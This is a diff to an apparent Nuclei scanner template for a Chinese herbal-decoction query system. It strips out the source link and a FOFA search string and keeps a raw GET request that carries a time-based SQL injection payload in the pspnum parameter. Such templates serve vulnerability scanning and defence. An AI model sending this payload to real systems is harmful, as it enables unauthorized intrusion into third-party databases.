@@ -3,12 +3,8 @@ info:
   name: 中药煎药查询系统 IndexNew 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vang7ecl9xc18p82'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vang7ecl9xc18p82
-    fofa: title="中药煎药查询"
 http:
 - raw:
   - 'GET /PreDetail/IndexNew?pspnum=1'';WAITFOR%20DELAY%20''0:0:5''-- HTTP/1.1
